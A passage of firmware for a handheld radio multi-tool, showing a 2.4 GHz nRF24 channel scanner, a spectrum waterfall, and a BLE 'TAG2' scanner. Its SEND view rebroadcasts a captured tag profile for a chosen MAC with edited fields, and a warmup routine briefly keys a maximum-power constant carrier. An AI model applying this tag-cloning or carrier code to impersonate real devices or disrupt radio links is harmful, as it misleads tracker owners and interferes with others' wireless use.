      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        // Confirm status-bar touch to reject noisy single-sample spikes.
        int cx = 0, cy = 0;
        delay(12);
        if (!readTouchXY(cx, cy) || abs(cx - x) > 10 || abs(cy - y) > 10) {
          lastTouchCheck = millis();
          return;
        }
        if (x >= 40 && x <= 56) {
          if (showingLoadedProfiles && !isSendView && !isDetailView) {
            lastTouchCheck = millis();
            return;
          }
          bool ok = false;
          if (isSendView) ok = saveCurrentSendConfigToSd();
          else ok = saveScanProfilesToSd();
          uiHoldUntilMs = millis() + 1200;
          showNotification("TAG2", ok ? "Config saved" : "Save failed");
          lastTouchActionMs = nowMs;
          screenNeedsUpdate = true;
          return;
        } else if (x >= 60 && x <= 76) {
          if (inLoadedScanView) {
            lastTouchCheck = millis();
            return;
          }
          bool ok = false;
          if (isSendView) {
            // SEND: manual profile for current MAC, fallback to last manual save.
            ok = loadProfileForMac(selectedMac, true);
            if (!ok) ok = loadLastSendConfigFromSd();
          } else {
            // SCAN: only non-manual profiles.
            ok = loadProfilesFromSdAsScan(true);
            if (ok && !lastScanProfiles.empty()) {
              // Replace current scan results with loaded profiles rendered as scan-like entries.
              tag2Indices.clear();
              rebuildLoadedProfileListFromCache();
              showingLoadedProfiles = true;
              current_page = 0;
              currentIndex = 0;
              listStartIndex = 0;
              isDetailView = false;
            }
          }
          uiHoldUntilMs = millis() + 1200;
          showNotification("TAG2", ok ? "Config loaded" : "Load unavailable");
          lastTouchActionMs = nowMs;
          screenNeedsUpdate = true;
          fullScreenUpdate = true;
          return;
        } else if (x >= 80 && x <= 96 && isSendView) {
          bool restored = false;
          auto it = lastScanProfiles.find(selectedMac);
          if (it != lastScanProfiles.end() && it->second.valid) {
            applyProfile(it->second);
            restored = true;
          }
          if (!restored) restoreBaseline();
          uiHoldUntilMs = millis() + 1200;
          showNotification("TAG2", "Reset done");
          lastTouchActionMs = nowMs;
          screenNeedsUpdate = true;
          return;
        }
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
              lastTouchActionMs = nowMs;
            }
            break;
          }
        }
      } else if (!isScanning) {
        if (isSendView) {
          // Last row controls in SEND: BACK, MODE, PW ON/OFF.
          if (y >= 304 && y <= 320) {
            if (x >= 0 && x <= 57) {
              isSendView = false;
              isDetailView = false;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (x >= 60 && x <= 117) {
              advFastMode = !advFastMode;
              applySendToAdvertiser();
              screenNeedsUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (x >= 177 && x <= 234) {
              advEnabled = !advEnabled;
              applySendToAdvertiser();
              screenNeedsUpdate = true;
              lastTouchActionMs = nowMs;
            }
          } else if (y >= 102 && y < 102 + 5 * 22) {
            selectedField = (y - 102) / 22;
            screenNeedsUpdate = true;
            lastTouchActionMs = nowMs;
            // Per-row tiny buttons: -, +, 0; Batt row has M (max 100).
            if (x >= 146 && x <= 222) {
              const int row = (y - 102) / 22;
              if (row >= 0 && row < 5) {
                if (x >= 146 && x <= 162) { // minus
                  if (row == 0 && fastHours > 0) fastHours--;
                  else if (row == 1 && slowHours > 0) slowHours--;
                  else if (row == 2 && connAttempts > 0) connAttempts--;
                  else if (row == 3 && buttonPresses > 0) buttonPresses--;
                  else if (row == 4) {
                    int b = (int)batteryLevel - batteryStepWithJitter();
                    batteryLevel = (uint8_t)constrain(b, 0, 100);
                  }
                } else if (x >= 164 && x <= 180) { // plus
                  if (row == 0 && fastHours < 255) fastHours++;
                  else if (row == 1 && slowHours < 65535) slowHours++;
                  else if (row == 2 && connAttempts < 255) connAttempts++;
                  else if (row == 3 && buttonPresses < 255) buttonPresses++;
                  else if (row == 4) {
                    int b = (int)batteryLevel + batteryStepWithJitter();
                    batteryLevel = (uint8_t)constrain(b, 0, 100);
                  }
                } else if (x >= 186 && x <= 202) { // reset literal to 0 (only non-battery rows)
                  if (row == 0) fastHours = 0;
                  else if (row == 1) slowHours = 0;
                  else if (row == 2) connAttempts = 0;
                  else if (row == 3) buttonPresses = 0;
                } else if (row == 4 && x >= 204 && x <= 222) { // MAX
                  batteryLevel = 100;
                }
                applySendToAdvertiser();
                screenNeedsUpdate = true;
              }
            }
          }
        } else {
          const int deviceCount = filteredCount();

          // Deauther-like bottom bar has a large touch hitbox.
          if (y >= 290 && y <= 320) {
            const bool prevDisabled = (current_page == 0);
            const bool nextDisabled = ((current_page + 1) * DEVICES_PER_PAGE >= deviceCount);

            if (x >= 0 && x <= 57) {
              if (isDetailView) {
                // Back (left) in detail view.
                isDetailView = false;
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              } else {
                drawButton(0, 304, 57, 16, "Rescan", true, false);
                delay(50);
                startBLEScan();
                lastTouchActionMs = nowMs;
              }
            } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
              drawButton(117, 304, 57, 16, "Prev", true, false);
              current_page--;
              if (current_page < 0) current_page = 0;
              currentIndex = current_page * DEVICES_PER_PAGE;
              listStartIndex = current_page * DEVICES_PER_PAGE;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (x >= 177 && x <= 240) {
              if (isDetailView) {
                // Use (right) in detail view.
                drawButton(177, 304, 57, 16, "Use", true, !hasSelectedTag2);
                if (hasSelectedTag2) {
                  isSendView = true;
                  isDetailView = false;
                  applySendToAdvertiser();
                }
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              } else if (!nextDisabled) {
                drawButton(177, 304, 57, 16, "Next", true, false);
                current_page++;
                currentIndex = current_page * DEVICES_PER_PAGE;
                listStartIndex = current_page * DEVICES_PER_PAGE;
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              }
            }
          } else if (!isDetailView) {
            // Distance model controls in scan list header.
            if (!showingLoadedProfiles && y >= 62 && y <= 76) {
              if (x >= 24 && x <= 40) {
                if (distanceTxPowerAt1m > -100) distanceTxPowerAt1m--;
                saveRfModelToSd();
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              } else if (x >= 42 && x <= 58) {
                if (distanceTxPowerAt1m < -20) distanceTxPowerAt1m++;
                saveRfModelToSd();
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              } else if (x >= 132 && x <= 148) {
                if (distanceN_x10 > 10) distanceN_x10--;
                saveRfModelToSd();
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              } else if (x >= 150 && x <= 166) {
                if (distanceN_x10 < 40) distanceN_x10++;
                saveRfModelToSd();
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              }
            }
            const int listMaxY = LIST_FIRST_ROW_Y + (DEVICES_PER_PAGE * LIST_ROW_H);
            if (deviceCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
              const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
              const int idx = (current_page * DEVICES_PER_PAGE) + row;
              if (idx >= 0 && idx < deviceCount) {
                currentIndex = idx;
                isDetailView = true;
                screenNeedsUpdate = true;
                fullScreenUpdate = true;
                lastTouchActionMs = nowMs;
              }
            }
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void bleScanSetup() {

  tft.fillScreen(TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  setupTouchscreen();
  loadRfModelFromSd();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);

  ensureBleInit();
  rebuildTag2Index();

  if (bgHasResults && filteredCount() > 0) {
    current_page = 0;
    currentIndex = 0;
    listStartIndex = 0;
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    updateBLEList();
  } else {
    startBLEScan();
  }
}

void bleScanLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    stopLiveScan();
    if (tag2Adv) tag2Adv->stop();
    advEnabled = false;
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, WHITE);
  handleButtons();

  updateStatusBar();
  runUI();

  if (screenNeedsUpdate) {
    screenNeedsUpdate = false;
    if (isSendView) {
      drawSendView();
    } else if (!isDetailView) {
      updateBLEList();
    } else {
      displayBLEDetails();
    }
    if (fullScreenUpdate) fullScreenUpdate = false;
  }
}

void startBackgroundScanner() {
  if (bgBleScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgBleScanTask,
    "bgBleScan",
    4096,
    nullptr,
    1,
    &bgBleScanTaskHandle,
    0
  );
}

int getLastCount() {

  if (!settings().autoBleScan) return 0;
  return filteredCount();
}

void exit() {

  stopLiveScan();
  if (tag2Adv) tag2Adv->stop();
  advEnabled = false;
  if (isScanning && bleScan) {
    bleScan->stop();
    isScanning = false;
  }
}
}


namespace Scanner {

#define CE  CE_PIN_1
#define CSN CSN_PIN_1

#define CHANNELS  128
int channel[CHANNELS];

#define N 128
uint8_t values[N];

static bool uiDrawn = false;

static constexpr uint16_t SCAN_SWEEPS        = 25;
static constexpr uint16_t DISPLAY_SWEEPS     = 15;
static constexpr uint16_t RX_SETTLE_US       = 100;
static constexpr uint16_t RPD_DWELL_US       = 50;
static constexpr uint32_t UI_THROTTLE_MS     = 35;
static constexpr uint16_t BUTTON_POLL_STRIDE = 8;

#define _NRF24_CONFIG   0x00
#define _NRF24_EN_AA    0x01
#define _NRF24_RF_CH    0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_RPD      0x09

int backgroundNoise[CHANNELS] = {0};

volatile bool scanning = true;
static uint32_t lastSweepHits = 0;
static uint8_t flatSweepCount = 0;
static RF24 nrfWarmup(CE_PIN_1, CSN_PIN_1, 16000000);
static RF24 nrfWarmup2(CE_PIN_2, CSN_PIN_2, 16000000);
static RF24 nrfWarmup3(CE_PIN_3, CSN_PIN_3, 16000000);

static void warmupOneNrf(RF24& r) {
  if (!r.begin()) return;
  r.setAutoAck(false);
  r.stopListening();
  r.setRetries(0, 0);
  r.setPALevel(RF24_PA_MAX, true);
  r.setDataRate(RF24_2MBPS);
  r.setCRCLength(RF24_CRC_DISABLED);
  // ProtoKill-like tiny carrier activity to force stable RF state.
  r.setChannel(2);
  r.startConstCarrier(RF24_PA_MAX, 2);
  delay(2);
  r.powerDown();
  delay(2);
}

static void warmupAllNrfModules() {
  warmupOneNrf(nrfWarmup);
  warmupOneNrf(nrfWarmup2);
  warmupOneNrf(nrfWarmup3);
}

#define SCREEN_HEIGHT 180
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

bool isSelectButtonPressed() {
  return pcf.digitalRead(BTN_SELECT) == LOW;
}

byte getRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

bool carrierDetected() {
  return getRegister(_NRF24_RPD) & 0x01;
}

void setRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

void setChannel(uint8_t channel) {
  setRegister(_NRF24_RF_CH, channel);
}

void powerUp() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
  delayMicroseconds(130);
}

void powerDown() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) & ~0x02);
}

void enable() {
  digitalWrite(CE, HIGH);
}

void disable() {
  digitalWrite(CE, LOW);
}

void setRX() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x01);
  enable();
  delayMicroseconds(100);
}

bool radioInitAndProbe(uint8_t retries = 4) {
  warmupAllNrfModules();
  for (uint8_t k = 0; k < retries; k++) {
    SPI.end();
    delay(6);

    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    SPI.begin(SD_SCLK, SD_MISO, SD_MOSI, CSN);
    SPI.setDataMode(SPI_MODE0);
    SPI.setFrequency(10000000);
    SPI.setBitOrder(MSBFIRST);

    pinMode(CE, OUTPUT);
    pinMode(CSN, OUTPUT);
    disable();
    digitalWrite(CSN, HIGH);
    delayMicroseconds(80);

    powerDown();
    delayMicroseconds(200);
    powerUp();
    setRegister(_NRF24_EN_AA, 0x00);
    setRegister(_NRF24_RF_SETUP, 0x0F);
    setRegister(_NRF24_CONFIG, 0x03); // PWR_UP + PRIM_RX
    setRegister(_NRF24_RF_CH, 40);
    const byte chProbe = getRegister(_NRF24_RF_CH);
    enable();
    delayMicroseconds(160);
    disable();

    const byte st = getRegister(0x07);
    if (st != 0x00 && st != 0xFF && chProbe == 40) {
      flatSweepCount = 0;
      return true;
    }
    delay(20);
  }
  return false;
}

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = TFT_WHITE;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void calibrateBackgroundNoise() {

  Print("[!] Calibrating background noise", TFT_ORANGE, false);

  for (int i = 0; i < 2; i++) {
    disable();
    for (int j = 0; j < 50; j++) {
      for (int i = 0; i < CHANNELS; i++) {

        setRegister(_NRF24_RF_CH, (uint8_t)i);
        enable();
        delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
        disable();
        if (carrierDetected()) channel[i]++;
      }
    }
    Print(".", TFT_WHITE, false);
    for (int j = 0; j < CHANNELS; j++) {
      backgroundNoise[j] += channel[j];

    }
  }

  for (int i = 0; i < CHANNELS; i++) {
    backgroundNoise[i] /= 5;
  }

  Print("[+] Background noise calibration", TFT_WHITE, false);
  Print("[+] done.", TFT_WHITE, false);
}

void scan() {
  Print("[!] Refresh Scanner.", TFT_ORANGE, false);
  disable();
  for (int j = 0; j < 50; j++) {
    for (int i = 0; i < CHANNELS; i++) {

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;
    }
  }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {

    tft.fillRect(0, 20, 160, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(35, 24);
    tft.print("2.4GHz Scanner");

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: calibrateBackgroundNoise(); break;
        case 1: scan(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;

                scanning = false;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void scanChannels() {
  lastSweepHits = 0;
  disable();
  static uint32_t lastUI = 0;
  for (int j = 0; j < (int)SCAN_SWEEPS && scanning; j++) {
    for (int i = 0; i < CHANNELS && scanning; i++) {

      if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
        scanning = false;
        Print("Scan interrupted by user", TFT_YELLOW, true);
        return;
      }
      if (feature_exit_requested) {
        scanning = false;
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) {
        channel[i]++;
        lastSweepHits++;
      }

      uint32_t now = millis();
      if (now - lastUI >= UI_THROTTLE_MS) {
        runUI();
        lastUI = now;
        delay(0);
        if (feature_exit_requested) {
          scanning = false;
          return;
        }
      }
    }
  }
}

void outputChannels() {
  int norm = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if (channel[i] > norm) norm = channel[i];
  }
  static uint32_t lastUI = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
      scanning = false;
      Print("Output interrupted by user", TFT_YELLOW, true);
      return;
    }
    int strength = (norm != 0) ? (channel[i] * 10) / norm : 0;
    (void)strength;
    channel[i] = 0;
    uint32_t now = millis();
    if (now - lastUI >= UI_THROTTLE_MS) {
      runUI();
      lastUI = now;
      delay(0);
    }
  }
}

void display() {
  runUI();

  #define SCREEN_WIDTH 0
  #define SCREEN_HEIGHT 308

  memset(values, 0, sizeof(values));

  int scanCycles = (int)DISPLAY_SWEEPS;
  while (scanCycles-- && scanning) {
    if (isSelectButtonPressed()) {
      scanning = false;
      Print("Display interrupted by user", TFT_YELLOW, true);
      return;
    }
    for (int i = 0; i < N && scanning; ++i) {
      setChannel(i);
      enable();

      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) {
        values[i]++;
      }
    }

    runUI();
    delay(0);
  }

  if (scanning) {
    tft.fillRect(0, 190, 240, 200, TFT_BLACK);

#define CHANNELS 128

    int barWidth = 1;
    int maxBarHeight = SCREEN_HEIGHT - 5;
    int x = 10;
    int xx = 120;

    for (int i = 0; i < 64; ++i) {
      int barHeight = values[i] * 3;
      if (barHeight > maxBarHeight) barHeight = maxBarHeight;

      tft.fillRect(x, SCREEN_HEIGHT - barHeight, barWidth, barHeight, TFT_WHITE);
      x += barWidth;
    }

    for (int i = 64; i < 128; ++i) {
      int barHeight = values[i] * 3;
      if (barHeight > maxBarHeight) barHeight = maxBarHeight;

      tft.fillRect(xx, SCREEN_HEIGHT - barHeight, barWidth, barHeight, TFT_WHITE);
      xx += barWidth;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 310);
    tft.print("1..5.10..20..40..50..80..90..110..128");

    int midX = 10;
    int midY = tft.height() - 13;

    tft.drawLine(midX, 200, midX, 305, TFT_WHITE);
    tft.drawLine(midX, midY, 230, midY, TFT_WHITE);

    tft.fillCircle(midX, midY, 1, TFT_RED);
    tft.fillCircle(10, 200, 1, TFT_RED);
    tft.fillCircle(230, midY, 1, TFT_RED);

    tft.setTextColor(TFT_WHITE);
    tft.setTextSize(1);
    tft.drawString("Y", midX + 5, 200);
    tft.drawString("X", tft.width() - 15, midY - 9);
  }
}

void scannerSetup() {
    tft.init();
    tft.setRotation(2);


  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  uiDrawn = false;
  display();

  setupTouchscreen();

  Print(" ", TFT_GREEN, false);
  Print(" ", TFT_GREEN, false);
  Print(" ", TFT_GREEN, false);
  Print("[*] 2.4GHz Scanner Initialized...", TFT_GREEN, false);

  radioInitAndProbe();

  scanning = true;
}

void scannerLoop() {
  scanning = true;
  while (scanning) {

    if (feature_active && isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      scanning = false;
      break;
    }
    if (feature_exit_requested) {
      scanning = false;
      break;
    }

    if (isSelectButtonPressed()) {
      scanning = false;
      Print("Scanner stopped by user", TFT_YELLOW, true);
      break;
    }
    runUI();
    scanChannels();
    if (lastSweepHits == 0) {
      if (++flatSweepCount >= 3) {
        Print("[!] Reinit NRF24...", TFT_YELLOW, false);
        radioInitAndProbe(5);
        flatSweepCount = 0;
      }
    } else {
      flatSweepCount = 0;
    }
    outputChannels();
    display();
    delay(5);
    }
  }
}

namespace Analyzer {

#define ANA_CE  CE_PIN_1
#define ANA_CSN CSN_PIN_1
#define ANA_CHANNELS 85           // WiFi-only: 2400-2484 MHz (same as Scanner)

// Data arrays
uint8_t current_levels[ANA_CHANNELS];
uint8_t peak_levels[ANA_CHANNELS];
unsigned long lastScanTime = 0;
unsigned long lastDisplayTime = 0;
bool analyzerRunning = true;

// ═══════════════════════════════════════════════════════════════════════════
// WATERFALL CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════
#define WATERFALL_HEIGHT 100      // Waterfall area height in pixels
#define WATERFALL_Y 215           // Waterfall starts below spectrum (after axes/labels)

// Waterfall history buffer - stores signal levels for each row
// Each row = one scan, scrolls down over time
uint8_t waterfall_buffer[WATERFALL_HEIGHT][ANA_CHANNELS];
int waterfall_row = 0;            // Current row being written to (circular buffer index)
bool waterfall_initialized = false;

// Color palette for waterfall (128 colors from black through teal to magenta)
uint16_t waterfall_palette[64];

// WiFi channel positions (NRF24 channel numbers)
// WiFi Ch 1 = 2412 MHz = NRF Ch 12
// WiFi Ch 6 = 2437 MHz = NRF Ch 37
// WiFi Ch 11 = 2462 MHz = NRF Ch 62
// WiFi Ch 13 = 2472 MHz = NRF Ch 72
const int WIFI_CH1 = 12;
const int WIFI_CH6 = 37;
const int WIFI_CH11 = 62;
const int WIFI_CH13 = 72;

// Display constants - SPECTRUM GRAPH (upper portion)
#define GRAPH_X 10
#define GRAPH_Y 50              // Start after header
#define GRAPH_WIDTH 220
#define GRAPH_HEIGHT 120        // Reduced to make room for waterfall
#define BAR_WIDTH 1

// NRF24 register definitions (same as Scanner)
#define _ANA_NRF24_CONFIG   0x00
#define _ANA_NRF24_EN_AA    0x01
#define _ANA_NRF24_RF_CH    0x05
#define _ANA_NRF24_RF_SETUP 0x06
#define _ANA_NRF24_RPD      0x09

byte anaGetRegister(byte r) {
    byte c;
    digitalWrite(ANA_CSN, LOW);
    SPI.transfer(r & 0x1F);
    c = SPI.transfer(0);
    digitalWrite(ANA_CSN, HIGH);
    return c;
}

void anaSetRegister(byte r, byte v) {
    digitalWrite(ANA_CSN, LOW);
    SPI.transfer((r & 0x1F) | 0x20);
    SPI.transfer(v);
    digitalWrite(ANA_CSN, HIGH);
}

void anaPowerUp() {
    anaSetRegister(_ANA_NRF24_CONFIG, anaGetRegister(_ANA_NRF24_CONFIG) | 0x02);
    delayMicroseconds(130);
}

void anaEnable() {
    digitalWrite(ANA_CE, HIGH);
}

void anaSetRX() {
    anaSetRegister(_ANA_NRF24_CONFIG, anaGetRegister(_ANA_NRF24_CONFIG) | 0x01);
    digitalWrite(ANA_CE, HIGH);
    delayMicroseconds(100);
}

void anaDisable() {
    digitalWrite(ANA_CE, LOW);
}

bool anaCarrierDetected() {
    return anaGetRegister(_ANA_NRF24_RPD) & 0x01;
}

// ═══════════════════════════════════════════════════════════════════════════
// WATERFALL WITH MAGENTA -> TEAL VERTICAL GRADIENT
// Top of waterfall = Magenta/Pink (#FF16A0)
// Bottom of waterfall = Cyan/Teal (#23D2C3)
// Dots shift color as they scroll down - LOOKS RAD AS FUCK
// ═══════════════════════════════════════════════════════════════════════════

void initWaterfallPalette() {
    // No longer using palette - colors calculated per-pixel based on position
    waterfall_initialized = true;
}

// HaleHound gradient waterfall
// Top (row 0) = Magenta/Pink, Bottom (row max) = Cyan
// Signal strength adjusts brightness
uint16_t getGradientWaterfallColor(uint8_t level, int row, int maxRows) {
    if (level == 0) return TFT_BLACK;

    // Calculate vertical position ratio (0.0 = top, 1.0 = bottom)
    float vRatio = (float)row / (float)(maxRows - 1);

    // Top color: Hot Pink - RGB(255, 28, 82)
    // Bottom color: Cyan - RGB(0, 207, 255)
    uint8_t r = 255 - (uint8_t)(vRatio * 255);    // 255 -> 0
    uint8_t g = 28 + (uint8_t)(vRatio * 179);     // 28 -> 207
    uint8_t b = 82 + (uint8_t)(vRatio * 173);     // 82 -> 255

    // Adjust brightness based on signal level (1-30 typical range)
    // Weak signals = dimmer, strong signals = full bright
    float brightness;
    if (level < 3) {
        brightness = 0.4f + (level * 0.1f);  // 0.5 - 0.7
    } else if (level < 10) {
        brightness = 0.7f + ((level - 3) * 0.03f);  // 0.7 - 0.91
    } else {
        brightness = 0.91f + ((level - 10) * 0.009f);  // 0.91 - 1.0
        if (brightness > 1.0f) brightness = 1.0f;
    }

    r = (uint8_t)(r * brightness);
    g = (uint8_t)(g * brightness);
    b = (uint8_t)(b * brightness);

    // Convert to RGB565
    return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
}

// ═══════════════════════════════════════════════════════════════════════════
// WATERFALL DRAWING
// ═══════════════════════════════════════════════════════════════════════════
void updateWaterfall() {
    // Store current scan data into waterfall buffer at current row
    for (int ch = 0; ch < ANA_CHANNELS; ch++) {
        waterfall_buffer[waterfall_row][ch] = current_levels[ch];
    }

    // Advance to next row (circular buffer)
    waterfall_row++;
    if (waterfall_row >= WATERFALL_HEIGHT) {
        waterfall_row = 0;
    }
}

void drawWaterfall() {
    // Clear waterfall area to black
    tft.fillRect(GRAPH_X, WATERFALL_Y, GRAPH_WIDTH, WATERFALL_HEIGHT, TFT_BLACK);

    // Draw waterfall - newest at top (magenta), oldest at bottom (cyan)
    int screenY = WATERFALL_Y;  // Start at TOP
    int bufferIdx = waterfall_row - 1;  // Most recent data
    if (bufferIdx < 0) bufferIdx = WATERFALL_HEIGHT - 1;

    for (int row = 0; row < WATERFALL_HEIGHT; row++) {
        for (int ch = 0; ch < ANA_CHANNELS; ch++) {
            uint8_t level = waterfall_buffer[bufferIdx][ch];

            // Only draw if signal exists
            if (level > 0) {
                int x = GRAPH_X + (ch * GRAPH_WIDTH / ANA_CHANNELS);
                uint16_t color = getGradientWaterfallColor(level, row, WATERFALL_HEIGHT);
                tft.drawPixel(x, screenY, color);
            }
        }

        screenY++;  // Move down on screen
        bufferIdx--;  // Move backward in buffer (older data)
        if (bufferIdx < 0) {
            bufferIdx = WATERFALL_HEIGHT - 1;
        }
    }
}

void clearWaterfallBuffer() {
    memset(waterfall_buffer, 0, sizeof(waterfall_buffer));
    waterfall_row = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// EXISTING FUNCTIONS (MODIFIED FOR NEW LAYOUT)
// ═══════════════════════════════════════════════════════════════════════════

void drawWiFiMarkers() {
    // Draw vertical lines for WiFi channels on spectrum
    int x1 = GRAPH_X + (WIFI_CH1 * GRAPH_WIDTH / ANA_CHANNELS);
    int x6 = GRAPH_X + (WIFI_CH6 * GRAPH_WIDTH / ANA_CHANNELS);
    int x11 = GRAPH_X + (WIFI_CH11 * GRAPH_WIDTH / ANA_CHANNELS);
    int x13 = GRAPH_X + (WIFI_CH13 * GRAPH_WIDTH / ANA_CHANNELS);

    // Draw dashed lines on spectrum (1, 6, 11 magenta, 13 yellow)
    for (int y = GRAPH_Y; y < GRAPH_Y + GRAPH_HEIGHT; y += 4) {
        tft.drawPixel(x1, y, ORANGE);
        tft.drawPixel(x6, y, ORANGE);
        tft.drawPixel(x11, y, ORANGE);
        tft.drawPixel(x13, y, TFT_YELLOW);
    }

    // Also draw on waterfall area
